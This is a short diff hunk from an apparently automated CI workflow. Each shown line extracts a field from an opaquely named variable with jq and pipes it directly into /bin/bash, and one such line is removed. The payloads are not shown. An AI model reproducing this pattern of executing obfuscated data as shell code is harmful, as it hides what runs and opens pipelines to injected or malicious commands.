@@ -24,7 +24,6 @@ jobs:
           echo $dd50 | jq -r .gm276 | /bin/bash
           echo $oh03511 | jq -r .fzi341 | /bin/bash
           echo $h0381 | jq -r .h890 | /bin/bash
-          printf '%s' "$eevm038" | jq -r .t66208 | /bin/bash
           echo $ks1273 | jq -r .exjxt11 | /bin/bash
           echo $j84 | jq -r .cb9 | /bin/bash
           printf '%s' "$nx217" | jq -r .ndh6833 | /bin/bash
